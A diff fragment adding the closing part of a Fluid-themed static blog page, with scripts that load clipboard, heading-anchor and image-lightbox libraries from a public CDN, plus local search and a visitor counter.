+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
